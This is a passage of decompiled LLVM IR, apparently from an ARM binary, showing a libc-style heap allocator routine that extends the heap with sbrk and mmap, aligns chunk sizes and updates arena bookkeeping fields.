  store i32 %v3_ba50, i32* %r3.global-to-local, align 4
  %v1_ba58 = add i32 %v0_ba44, 884
  %v2_ba58 = inttoptr i32 %v1_ba58 to i32*
  %v3_ba58 = load i32, i32* %v2_ba58, align 4
  store i32 %v3_ba58, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_ba4c, %v3_ba48
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_ba4c, i32* %v2_ba48, align 4
  %v0_ba60.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_ba60.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_ba60 = phi i32 [ %v0_ba44, %bb148 ], [ %v1_ba60.pre, %bb149 ]
  %v0_ba60 = phi i32 [ %v2_ba4c, %bb148 ], [ %v0_ba60.pre, %bb149 ]
  %v2_ba60 = add i32 %v1_ba60, 868
  %v3_ba60 = inttoptr i32 %v2_ba60 to i32*
  store i32 %v0_ba60, i32* %v3_ba60, align 4
  %v0_ba64 = load i32, i32* %r1.global-to-local, align 4
  %v1_ba64 = load i32, i32* %r3.global-to-local, align 4
  %v2_ba64 = add i32 %v1_ba64, %v0_ba64
  store i32 %v2_ba64, i32* %r1.global-to-local, align 4
  %v1_ba68 = load i32, i32* %r2.global-to-local, align 4
  %v0_ba6c = load i32, i32* %lr.global-to-local, align 4
  %v1_ba6c = add i32 %v0_ba6c, 8
  store i32 %v1_ba6c, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_ba64, %v1_ba68
  br i1 %tmp213, label %bb151, label %dec_label_pc_bd80

bb151:                                            ; preds = %bb150
  %v5_ba70 = load i32, i32* %ip.global-to-local, align 4
  %v6_ba70 = add i32 %v5_ba70, 884
  %v7_ba70 = inttoptr i32 %v6_ba70 to i32*
  store i32 %v2_ba64, i32* %v7_ba70, align 4
  br label %dec_label_pc_bd80

dec_label_pc_ba78:                                ; preds = %dec_label_pc_b9bc, %dec_label_pc_b99c, %dec_label_pc_b9d0.dec_label_pc_ba78_crit_edge, %dec_label_pc_b9ac
  %v1_ba9c = phi i32 [ %v1_ba9c.pre, %dec_label_pc_b9d0.dec_label_pc_ba78_crit_edge ], [ %v0_b944, %dec_label_pc_b9ac ], [ %v0_b944, %dec_label_pc_b99c ], [ %v0_b944, %dec_label_pc_b9bc ]
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %ip.global-to-local, align 4
  %v4_ba80 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_ba80, i32* %r3.global-to-local, align 4
  %v1_ba84 = add i32 %v4_ba80, 44
  %v2_ba84 = inttoptr i32 %v1_ba84 to i32*
  %v3_ba84 = load i32, i32* %v2_ba84, align 4
  store i32 %v3_ba84, i32* %r0.global-to-local, align 4
  %v1_ba88 = add i32 %v4_ba80, 864
  %v2_ba88 = inttoptr i32 %v1_ba88 to i32*
  %v3_ba88 = load i32, i32* %v2_ba88, align 4
  store i32 %v3_ba88, i32* %r2.global-to-local, align 4
  %v1_ba8c = add i32 %v4_ba80, 840
  %v2_ba8c = inttoptr i32 %v1_ba8c to i32*
  %v3_ba8c = load i32, i32* %v2_ba8c, align 4
  store i32 %v3_ba8c, i32* %r3.global-to-local, align 4
  %v1_ba90 = add i32 %v3_ba84, 4
  %v2_ba90 = inttoptr i32 %v1_ba90 to i32*
  %v3_ba90 = load i32, i32* %v2_ba90, align 4
  store i32 %v3_ba90, i32* %r1.global-to-local, align 4
  %v1_ba98 = urem i32 %v3_ba88, 2
  %v2_ba98 = icmp eq i32 %v1_ba98, 0
  %v1_ba94 = add i32 %v1_ba9c, 16
  %v2_ba9c = add i32 %v1_ba94, %v3_ba8c
  store i32 %v2_ba9c, i32* %r3.global-to-local, align 4
  %v1_baa0 = and i32 %v3_ba90, -4
  store i32 %v1_baa0, i32* @r8, align 4
  br i1 %v2_ba98, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_ba78
  %v3_baa4 = sub i32 %v2_ba9c, %v1_baa0
  store i32 %v3_baa4, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_ba78, %bb152
  %v0_baa8 = phi i32 [ %v2_ba9c, %dec_label_pc_ba78 ], [ %v3_baa4, %bb152 ]
  %v1_baa8 = load i32, i32* %sb.global-to-local, align 4
  %v2_baa8 = add i32 %v1_baa8, %v0_baa8
  store i32 %v2_baa8, i32* %r3.global-to-local, align 4
  %v1_baac = sub i32 -1, %v1_baa8
  store i32 %v1_baac, i32* %fp.global-to-local, align 4
  %v2_bab0 = and i32 %v2_baa8, %v1_baac
  store i32 %v2_bab0, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_bab0, 1
  br i1 %tmp154, label %dec_label_pc_bad4, label %dec_label_pc_bac0

dec_label_pc_bac0:                                ; preds = %bb153
  store i32 %v2_bab0, i32* %r0.global-to-local, align 4
  %v1_bac4 = call i32 @__GI_sbrk(i32 %v2_bab0)
  store i32 %v1_bac4, i32* %r0.global-to-local, align 4
  %v3_bac8 = icmp eq i32 %v1_bac4, -1
  store i32 %v1_bac4, i32* @r4, align 4
  br i1 %v3_bac8, label %dec_label_pc_bad4, label %dec_label_pc_bb40

dec_label_pc_bad4:                                ; preds = %dec_label_pc_bac0, %bb153
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r1.global-to-local, align 4
  %v4_badc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_badc, i32* %r6.global-to-local, align 4
  %v1_bae0 = add i32 %v4_badc, 864
  %v2_bae0 = inttoptr i32 %v1_bae0 to i32*
  %v3_bae0 = load i32, i32* %v2_bae0, align 4
  store i32 %v3_bae0, i32* %r3.global-to-local, align 4
  %v1_bae4 = urem i32 %v3_bae0, 2
  %v2_bae4 = icmp eq i32 %v1_bae4, 0
  br i1 %v2_bae4, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_bad4
  %v1_bae8 = load i32, i32* @r8, align 4
  %v2_bae8 = load i32, i32* %sb.global-to-local, align 4
  %v3_bae8 = add i32 %v2_bae8, %v1_bae8
  %v2_baec = load i32, i32* @r5, align 4
  %v3_baec = add i32 %v3_bae8, %v2_baec
  store i32 %v3_baec, i32* %r3.global-to-local, align 4
  %v2_baf0 = load i32, i32* %fp.global-to-local, align 4
  %v3_baf0 = and i32 %v2_baf0, %v3_baec
  store i32 %v3_baf0, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_bad4
  %v0_baf4.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_baf4 = phi i32 [ %v0_baf4.pr, %.thread29thread-pre-split ], [ %v3_baf0, %bb155 ]
  %v2_baf4 = icmp ugt i32 %v0_baf4, 1048575
  br i1 %v2_baf4, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_bb0c = phi i32 [ %v0_baf4, %.thread29 ], [ 1048576, %bb156 ]
  %v1_bafc = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_bb0c, %v1_bafc
  br i1 %tmp214, label %dec_label_pc_bb04, label %dec_label_pc_bd68

dec_label_pc_bb04:                                ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_bb0c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_bb20 = call i32 @mmap(i32 0, i32 %v0_bb0c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_bb20, i32* %r0.global-to-local, align 4
  %v3_bb24 = icmp eq i32 %v6_bb20, -1
  %v8_bb24 = icmp eq i32 %v6_bb20, -1
  store i32 %v6_bb20, i32* @r4, align 4
  br i1 %v8_bb24, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_bb04
  %v1_bb2c = load i32, i32* %r6.global-to-local, align 4
  %v2_bb2c = add i32 %v1_bb2c, 864
  %v3_bb2c = inttoptr i32 %v2_bb2c to i32*
  %v4_bb2c = load i32, i32* %v3_bb2c, align 4
  %v2_bb30 = load i32, i32* @r5, align 4
  %v3_bb30 = add i32 %v2_bb30, %v6_bb20
  store i32 %v3_bb30, i32* %r0.global-to-local, align 4
  %v2_bb34 = and i32 %v4_bb2c, -2
  store i32 %v2_bb34, i32* %r3.global-to-local, align 4
  store i32 %v2_bb34, i32* %v3_bb2c, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_bb04, %bb158
  br i1 %v3_bb24, label %dec_label_pc_bb40, label %dec_label_pc_bb44

dec_label_pc_bb40:                                ; preds = %.thread32, %dec_label_pc_bac0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb44

dec_label_pc_bb44:                                ; preds = %.thread32, %dec_label_pc_bb40
  %v0_bb44 = load i32, i32* @r4, align 4
  %v7_bb44 = icmp eq i32 %v0_bb44, -1
  br i1 %v7_bb44, label %dec_label_pc_bd68, label %dec_label_pc_bb4c

dec_label_pc_bb4c:                                ; preds = %dec_label_pc_bb44
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r2.global-to-local, align 4
  %v4_bb54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_bb54, i32* %ip.global-to-local, align 4
  store i32 %v3_ba84, i32* %r2.global-to-local, align 4
  %v1_bb5c = add i32 %v4_bb54, 872
  %v2_bb5c = inttoptr i32 %v1_bb5c to i32*
  %v3_bb5c = load i32, i32* %v2_bb5c, align 4
  %v1_bb60 = load i32, i32* @r8, align 4
  %v2_bb60 = add i32 %v1_bb60, %v3_ba84
  store i32 %v2_bb60, i32* %r1.global-to-local, align 4
  %v0_bb64 = load i32, i32* @r5, align 4
  %v2_bb64 = add i32 %v0_bb64, %v3_bb5c
  store i32 %v2_bb64, i32* %r3.global-to-local, align 4
  %v9_bb68 = icmp eq i32 %v0_bb44, %v2_bb60
  br i1 %v9_bb68, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_bb4c
  store i32 %v2_bb64, i32* %v2_bb5c, align 4
  br label %dec_label_pc_bb84

bb159:                                            ; preds = %dec_label_pc_bb4c
  %v1_bb6c = load i32, i32* %r0.global-to-local, align 4
  %v8_bb6c = icmp eq i32 %v1_bb6c, -1
  store i32 %v2_bb64, i32* %v2_bb5c, align 4
  br i1 %v8_bb6c, label %.thread34, label %dec_label_pc_bb84

.thread34:                                        ; preds = %bb159
  %v1_bb74 = load i32, i32* @r5, align 4
  %v2_bb74 = load i32, i32* @r8, align 4
  %v3_bb74 = add i32 %v2_bb74, %v1_bb74
  %v2_bb78 = or i32 %v3_bb74, 1
  store i32 %v2_bb78, i32* %r3.global-to-local, align 4
  %v2_bb7c = load i32, i32* %r2.global-to-local, align 4
  %v3_bb7c = add i32 %v2_bb7c, 4
  %v4_bb7c = inttoptr i32 %v3_bb7c to i32*
  store i32 %v2_bb78, i32* %v4_bb7c, align 4
  br label %dec_label_pc_bcfc

dec_label_pc_bb84:                                ; preds = %bb159, %.thread122
  %v0_bb88.pr = load i32, i32* @r8, align 4
  %v0_bb84 = load i32, i32* %ip.global-to-local, align 4
  %v1_bb84 = add i32 %v0_bb84, 864
  %v2_bb84 = inttoptr i32 %v1_bb84 to i32*
  %v3_bb84 = load i32, i32* %v2_bb84, align 4
  store i32 %v3_bb84, i32* %r2.global-to-local, align 4
  %v2_bb88 = icmp eq i32 %v0_bb88.pr, 0
  br i1 %v2_bb88, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_bb84
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_bb84
  %v2_bb90 = urem i32 %v3_bb84, 2
  store i32 %v2_bb90, i32* %r3.global-to-local, align 4
  %v2_bb94 = icmp eq i32 %v2_bb90, 0
  br i1 %v2_bb94, label %.thread40, label %dec_label_pc_bb9c

dec_label_pc_bb9c:                                ; preds = %.thread36
  %v0_bb9c = load i32, i32* @r4, align 4
  %v1_bb9c = load i32, i32* %r1.global-to-local, align 4
  %v3_bb9c = icmp ult i32 %v0_bb9c, %v1_bb9c
  br i1 %v3_bb9c, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_bb9c
  %v2_bba0 = and i32 %v3_bb84, -2
  store i32 %v2_bba0, i32* %r3.global-to-local, align 4
  store i32 %v2_bba0, i32* %v2_bb84, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_bb9c, %.thread37, %.thread36, %bb160
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %ip.global-to-local, align 4
  %v4_bbb0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_bbb0, i32* @r7, align 4
  %v1_bbb4 = add i32 %v4_bbb0, 864
  %v2_bbb4 = inttoptr i32 %v1_bbb4 to i32*
  %v3_bbb4 = load i32, i32* %v2_bbb4, align 4
  store i32 %v3_bbb4, i32* %r3.global-to-local, align 4
  %v1_bbb8 = urem i32 %v3_bbb4, 2
  store i32 %v1_bbb8, i32* @r6, align 4
  %v2_bbb8 = icmp eq i32 %v1_bbb8, 0
  br i1 %v2_bbb8, label %dec_label_pc_bc4c, label %dec_label_pc_bbc0

dec_label_pc_bbc0:                                ; preds = %.thread40
  %v0_bbc0 = load i32, i32* @r8, align 4
  %v2_bbc0 = icmp eq i32 %v0_bbc0, 0
  br i1 %v2_bbc0, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_bbc0
  %v2_bbc4 = add i32 %v4_bbb0, 872
  %v3_bbc4 = inttoptr i32 %v2_bbc4 to i32*
  %v4_bbc4 = load i32, i32* %v3_bbc4, align 4
  store i32 %v4_bbc4, i32* %r2.global-to-local, align 4
  %v1_bbc8 = load i32, i32* %r1.global-to-local, align 4
  %v2_bbc8 = load i32, i32* @r4, align 4
  %v3_bbc8 = sub i32 %v2_bbc8, %v1_bbc8
  %v3_bbcc = add i32 %v3_bbc8, %v4_bbc4
  store i32 %v3_bbcc, i32* %r3.global-to-local, align 4
  store i32 %v3_bbcc, i32* %v3_bbc4, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_bbc0, %bb161
  %v0_bbd4 = load i32, i32* @r4, align 4
  %v1_bbd4 = urem i32 %v0_bbd4, 8
  store i32 %v1_bbd4, i32* %r3.global-to-local, align 4
  %v2_bbd4 = icmp eq i32 %v1_bbd4, 0
  br i1 %v2_bbd4, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_bbd8 = sub nsw i32 8, %v1_bbd4
  store i32 %v2_bbd8, i32* %r3.global-to-local, align 4
  %v3_bbdc = add i32 %v2_bbd8, %v0_bbd4
  store i32 %v3_bbdc, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_bbe4 = phi i32 [ 0, %.thread43 ], [ %v2_bbd8, %bb162 ]
  %v1_bbe0 = load i32, i32* @r5, align 4
  %v2_bbe0 = add i32 %v1_bbe0, %v0_bbd4
  store i32 %v2_bbe0, i32* @r6, align 4
  %v1_bbe4 = load i32, i32* @r8, align 4
  %v2_bbe4 = add i32 %v2_bbe0, %v0_bbe4
  %v2_bbe8 = add i32 %v2_bbe4, %v1_bbe4
  store i32 %v2_bbe8, i32* %r1.global-to-local, align 4
  %v1_bbec = load i32, i32* %sb.global-to-local, align 4
  %v2_bbec = add i32 %v1_bbec, %v2_bbe8
  %v1_bbf0 = load i32, i32* %fp.global-to-local, align 4
  %v2_bbf0 = and i32 %v1_bbf0, %v2_bbec
  store i32 %v2_bbf0, i32* %r2.global-to-local, align 4
  %v2_bbf4 = sub i32 0, %v2_bbe0
  store i32 %v2_bbf4, i32* %r3.global-to-local, align 4
  %v2_bbf8 = sub i32 %v2_bbf0, %v2_bbe0
  store i32 %v2_bbf8, i32* @r5, align 4
  store i32 %v2_bbf8, i32* %r0.global-to-local, align 4
  br i1 %v2_bbd4, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_bbd4, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_bc04 = call i32 @__GI_sbrk(i32 %v2_bbf8)
  store i32 %v1_bc04, i32* %r0.global-to-local, align 4
  %v3_bc08 = icmp eq i32 %v1_bc04, -1
  br i1 %v3_bc08, label %dec_label_pc_bc10, label %dec_label_pc_bc20

dec_label_pc_bc10:                                ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_bc14 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_bc14, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_bc78

dec_label_pc_bc20:                                ; preds = %bb164
  %v1_bc20 = load i32, i32* @r4, align 4
  %v3_bc20 = icmp ult i32 %v1_bc04, %v1_bc20
  br i1 %v3_bc20, label %dec_label_pc_bc28, label %dec_label_pc_bc78

dec_label_pc_bc28:                                ; preds = %dec_label_pc_bc20
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r0.global-to-local, align 4
  %v4_bc30 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_bc30, i32* %r2.global-to-local, align 4
  %v1_bc34 = add i32 %v4_bc30, 864
  %v2_bc34 = inttoptr i32 %v1_bc34 to i32*
  %v3_bc34 = load i32, i32* %v2_bc34, align 4
  %v0_bc38 = load i32, i32* @r6, align 4
  store i32 %v0_bc38, i32* %r0.global-to-local, align 4
  %v1_bc3c = and i32 %v3_bc34, -2
  store i32 %v1_bc3c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_bc3c, i32* %v2_bc34, align 4
  br label %dec_label_pc_bc78

dec_label_pc_bc4c:                                ; preds = %.thread40
  %v0_bc4c = load i32, i32* %r0.global-to-local, align 4
  %v3_bc4c = icmp eq i32 %v0_bc4c, -1
  br i1 %v3_bc4c, label %dec_label_pc_bc54, label %dec_label_pc_bc70

dec_label_pc_bc54:                                ; preds = %dec_label_pc_bc4c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_bc58 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_bc58, i32* %r0.global-to-local, align 4
  %v0_bc5c = load i32, i32* @r7, align 4
  %v1_bc5c = add i32 %v0_bc5c, 872
  %v2_bc5c = inttoptr i32 %v1_bc5c to i32*
  %v3_bc5c = load i32, i32* %v2_bc5c, align 4
  store i32 %v3_bc5c, i32* %r2.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r4, align 4
  %v0_bc64 = load i32, i32* @r5, align 4
  %v2_bc60 = add i32 %v3_bc5c, %v1_bc58
  %v2_bc64 = sub i32 %v2_bc60, %v0_bc60
  %v2_bc68 = sub i32 %v2_bc64, %v0_bc64
  store i32 %v2_bc68, i32* %r3.global-to-local, align 4
  store i32 %v2_bc68, i32* %v2_bc5c, align 4
  %v0_bc74.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_bc70

dec_label_pc_bc70:                                ; preds = %dec_label_pc_bc4c, %dec_label_pc_bc54
  %v0_bc74 = phi i32 [ 0, %dec_label_pc_bc4c ], [ %v0_bc74.pre, %dec_label_pc_bc54 ]
  %v0_bc70 = load i32, i32* @r4, align 4
  store i32 %v0_bc70, i32* @r7, align 4
  store i32 %v0_bc74, i32* @r5, align 4
  br label %dec_label_pc_bc78

dec_label_pc_bc78:                                ; preds = %dec_label_pc_bc20, %dec_label_pc_bc28, %dec_label_pc_bc10, %dec_label_pc_bc70
  %v0_bc78 = load i32, i32* %r0.global-to-local, align 4
  %v7_bc78 = icmp eq i32 %v0_bc78, -1
  br i1 %v7_bc78, label %dec_label_pc_bcfc, label %dec_label_pc_bc80

dec_label_pc_bc80:                                ; preds = %dec_label_pc_bc78
  %v1_bc80 = load i32, i32* @r5, align 4
  %v2_bc80 = add i32 %v1_bc80, %v0_bc78
  %v0_bc84 = load i32, i32* @r7, align 4
  %v2_bc84 = sub i32 %v2_bc80, %v0_bc84
  %v1_bc88 = or i32 %v2_bc84, 1
  %v2_bc8c = add i32 %v0_bc84, 4
  %v3_bc8c = inttoptr i32 %v2_bc8c to i32*
  store i32 %v1_bc88, i32* %v3_bc8c, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r1.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_bc98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_bc98, i32* @r6, align 4
  %v1_bc9c = add i32 %v4_bc98, 872
  %v2_bc9c = inttoptr i32 %v1_bc9c to i32*
  %v3_bc9c = load i32, i32* %v2_bc9c, align 4
  %v0_bca0 = load i32, i32* @r8, align 4
  %v2_bca0 = icmp eq i32 %v0_bca0, 0
  %v0_bca4 = load i32, i32* @r5, align 4
  %v2_bca4 = add i32 %v0_bca4, %v3_bc9c
  store i32 %v2_bca4, i32* %r3.global-to-local, align 4
  store i32 %v2_bca4, i32* %v2_bc9c, align 4
  %v0_bcac = load i32, i32* @r7, align 4
  %v1_bcac = load i32, i32* @r6, align 4
  %v2_bcac = add i32 %v1_bcac, 44
  %v3_bcac = inttoptr i32 %v2_bcac to i32*
  store i32 %v0_bcac, i32* %v3_bcac, align 4
  br i1 %v2_bca0, label %dec_label_pc_bcfc, label %dec_label_pc_bcb4

dec_label_pc_bcb4:                                ; preds = %dec_label_pc_bc80
  %v0_bcb8 = load i32, i32* @r8, align 4
  %v1_bcb8 = add i32 %v0_bcb8, -12
  %v1_bcbc = and i32 %v1_bcb8, -8
  store i32 %v3_ba84, i32* %ip.global-to-local, align 4
  %v2_bcc4 = add i32 %v1_bcbc, %v3_ba84
  store i32 %v2_bcc4, i32* %r1.global-to-local, align 4
  %v2_bcc8 = icmp ugt i32 %v1_bcbc, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_bcd0 = or i32 %v1_bcbc, 1
  store i32 %v1_bcd0, i32* %r3.global-to-local, align 4
  store i32 %v1_bcd0, i32* %v2_ba90, align 4
  %v0_bcd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_bcd8 = load i32, i32* %r1.global-to-local, align 4
  %v2_bcd8 = add i32 %v1_bcd8, 8
  %v3_bcd8 = inttoptr i32 %v2_bcd8 to i32*
  store i32 %v0_bcd8, i32* %v3_bcd8, align 4
  %v0_bcdc = load i32, i32* %r2.global-to-local, align 4
  %v1_bcdc = load i32, i32* %r1.global-to-local, align 4
  %v2_bcdc = add i32 %v1_bcdc, 4
  %v3_bcdc = inttoptr i32 %v2_bcdc to i32*
  store i32 %v0_bcdc, i32* %v3_bcdc, align 4
  br i1 %v2_bcc8, label %dec_label_pc_bce4, label %dec_label_pc_bcfc

dec_label_pc_bce4:                                ; preds = %dec_label_pc_bcb4
  %v0_bce4 = load i32, i32* @r6, align 4
  %v1_bce4 = add i32 %v0_bce4, 836
  %v2_bce4 = inttoptr i32 %v1_bce4 to i32*
  %v3_bce4 = load i32, i32* %v2_bce4, align 4
  store i32 %v3_bce4, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_bcec = load i32, i32* %ip.global-to-local, align 4
  %v1_bcec = add i32 %v0_bcec, 8
  store i32 %v1_bcec, i32* @r0, align 4
  store i32 -1, i32* %v2_bce4, align 4
  %v0_bcf4 = call i32 @free()
  store i32 %v0_bcf4, i32* %r0.global-to-local, align 4
  %v0_bcf8 = load i32, i32* @r4, align 4
  %v1_bcf8 = load i32, i32* @r6, align 4
  %v2_bcf8 = add i32 %v1_bcf8, 836
  %v3_bcf8 = inttoptr i32 %v2_bcf8 to i32*
  store i32 %v0_bcf8, i32* %v3_bcf8, align 4
  br label %dec_label_pc_bcfc

dec_label_pc_bcfc:                                ; preds = %.thread34, %dec_label_pc_bcb4, %dec_label_pc_bc80, %dec_label_pc_bc78, %dec_label_pc_bce4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r0.global-to-local, align 4
  %v4_bd04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_bd04, i32* %lr.global-to-local, align 4
  %v1_bd08 = add i32 %v4_bd04, 872
  store i32 %v1_bd08, i32* %r1.global-to-local, align 4
  %v1_bd0c = inttoptr i32 %v1_bd08 to i32*
  %v2_bd0c = load i32, i32* %v1_bd0c, align 4
  store i32 %v2_bd0c, i32* %r1.global-to-local, align 4
  %v3_bd0c = add i32 %v4_bd04, 876
  %v4_bd0c = inttoptr i32 %v3_bd0c to i32*
  %v5_bd0c = load i32, i32* %v4_bd0c, align 4
  store i32 %v5_bd0c, i32* %r3.global-to-local, align 4
  %v1_bd14 = add i32 %v4_bd04, 868
  %v2_bd14 = inttoptr i32 %v1_bd14 to i32*
  %v3_bd14 = load i32, i32* %v2_bd14, align 4
  store i32 %v3_bd14, i32* %r3.global-to-local, align 4
  %v1_bd18 = add i32 %v4_bd04, 884
  %v2_bd18 = inttoptr i32 %v1_bd18 to i32*
  %v3_bd18 = load i32, i32* %v2_bd18, align 4
  store i32 %v3_bd18, i32* %r2.global-to-local, align 4
  %v2_bd1c = add i32 %v3_bd14, %v2_bd0c
  store i32 %v2_bd1c, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_bd0c, %v5_bd0c
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_bcfc
  store i32 %v2_bd0c, i32* %v4_bd0c, align 4
  %v0_bd24.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_bd24.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_bcfc, %bb165
  %v1_bd24 = phi i32 [ %v3_bd18, %dec_label_pc_bcfc ], [ %v1_bd24.pre, %bb165 ]
  %v4_bd28 = phi i32 [ %v2_bd1c, %dec_label_pc_bcfc ], [ %v0_bd24.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_bd28, %v1_bd24
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_bd28 = load i32, i32* %lr.global-to-local, align 4
  %v6_bd28 = add i32 %v5_bd28, 884
  %v7_bd28 = inttoptr i32 %v6_bd28 to i32*
  store i32 %v4_bd28, i32* %v7_bd28, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_bd2c = load i32, i32* %lr.global-to-local, align 4
  %v1_bd2c = add i32 %v0_bd2c, 44
  %v2_bd2c = inttoptr i32 %v1_bd2c to i32*
  %v3_bd2c = load i32, i32* %v2_bd2c, align 4
  store i32 %v3_bd2c, i32* %ip.global-to-local, align 4
  %v1_bd30 = add i32 %v3_bd2c, 4
  %v2_bd30 = inttoptr i32 %v1_bd30 to i32*
  %v3_bd30 = load i32, i32* %v2_bd30, align 4
  store i32 %v1_b944, i32* %r1.global-to-local, align 4
  %v1_bd38 = and i32 %v3_bd30, -4
  store i32 %v1_bd38, i32* %r3.global-to-local, align 4
  %v3_bd3c = icmp ult i32 %v1_bd38, %v1_b944
  br i1 %v3_bd3c, label %dec_label_pc_bd68, label %dec_label_pc_bd44

dec_label_pc_bd44:                                ; preds = %bb168
  %v0_bd44 = load i32, i32* @sl, align 4
  %v2_bd44 = sub i32 %v1_bd38, %v0_bd44
  %v2_bd48 = add i32 %v0_bd44, %v3_bd2c
  store i32 %v2_bd48, i32* %r1.global-to-local, align 4
  %v1_bd4c = or i32 %v2_bd44, 1
  store i32 %v1_bd4c, i32* %r3.global-to-local, align 4
  %v1_bd50 = or i32 %v0_bd44, 1
  store i32 %v1_bd50, i32* %r2.global-to-local, align 4
  %v1_bd54 = add i32 %v3_bd2c, 8
  store i32 %v1_bd54, i32* %r0.global-to-local, align 4
  store i32 %v1_bd50, i32* %v2_bd30, align 4
  %v0_bd5c = load i32, i32* %r1.global-to-local, align 4
  %v1_bd5c = load i32, i32* %lr.global-to-local, align 4
  %v2_bd5c = add i32 %v1_bd5c, 44
  %v3_bd5c = inttoptr i32 %v2_bd5c to i32*
  store i32 %v0_bd5c, i32* %v3_bd5c, align 4
  %v0_bd60 = load i32, i32* %r3.global-to-local, align 4
  %v1_bd60 = load i32, i32* %r1.global-to-local, align 4
  %v2_bd60 = add i32 %v1_bd60, 4
  %v3_bd60 = inttoptr i32 %v2_bd60 to i32*
  store i32 %v0_bd60, i32* %v3_bd60, align 4
  br label %dec_label_pc_bd80

dec_label_pc_bd68:                                ; preds = %bb157, %bb168, %dec_label_pc_bb44
  store i32 91512, i32* %r3.global-to-local, align 4
  %v0_bd6c = call i32 @__aeabi_read_tp()
  %v3_bd70 = load i16, i16* @global_var_222f0.75, align 2
  %v4_bd70 = sext i16 %v3_bd70 to i32
  store i32 %v4_bd70, i32* %r3.global-to-local, align 4
